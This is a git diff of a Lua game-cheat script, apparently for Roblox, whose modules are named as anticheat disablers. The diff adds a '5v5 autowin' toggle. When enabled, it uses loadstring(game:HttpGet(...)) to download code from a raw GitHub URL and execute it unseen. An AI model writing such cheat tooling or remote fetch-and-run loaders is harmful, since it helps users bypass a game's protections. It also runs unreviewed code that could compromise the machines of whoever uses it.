@@ -227,7 +227,16 @@ local AnticheatDisabler = COB("Blatant", {
 	HoverText = "OP with gravity and custom speed"
 })
 
-
+local AnticheatDisabler = COB("Blatant", {
+	Name = "5v5 autowin",
+	Function = function(callback) 
+		if callback then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/deznuteeeeeees/dnut-loadstring/main/random%20stuff"))()
+		end
+	end,
+	Default = false,
+	HoverText = "autowin"
+})
 local AnticheatDisabler = COB("World", {
 	Name = "UltraFPSBoost",
 	Function = function(callback) 
